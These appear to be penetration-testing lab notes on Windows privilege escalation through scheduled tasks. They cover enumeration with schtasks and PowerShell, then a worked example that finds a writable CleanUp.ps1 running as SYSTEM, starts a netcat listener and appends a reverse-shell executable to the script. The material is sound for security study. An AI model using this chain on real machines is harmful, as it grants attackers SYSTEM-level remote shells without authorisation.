List all scheduled tasks that your user can see
```
# CMD
schtasks /query /fo LIST /v

#PS
Get-ScheduledTask | where {$_.Taskpath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```
- often have to rely on other clues, such as a script or log file that references a scheduled asks since a user can only see certain tasks


**Example:**
1. Directory of note called "DevTools" that has "CleanUp.ps1"
![](assets/Pasted%20image%2020260607143308.png)

2. Cat contents to see that it is running every minute as SYSTEM
![](assets/Pasted%20image%2020260607143330.png)

3. Use accesschk.exe to check permissions on script
```
.\accesschk.exe /accepteula -quv user CleanUp.ps1
```
![](assets/Pasted%20image%2020260607143410.png)
- can write to file > insert own commands to run as system

4. Start listener and inject payload
```
# On Kali
nc -lvnp <port>

# On Victim - Backup script
copy CleanUp.ps1 C:\Temp\

# Append call to execute reverse shell
echo C:\PrivEsc.exe >> CleanUp.ps1
```
![](assets/Pasted%20image%2020260607143555.png)
![](assets/Pasted%20image%2020260607143605.png)


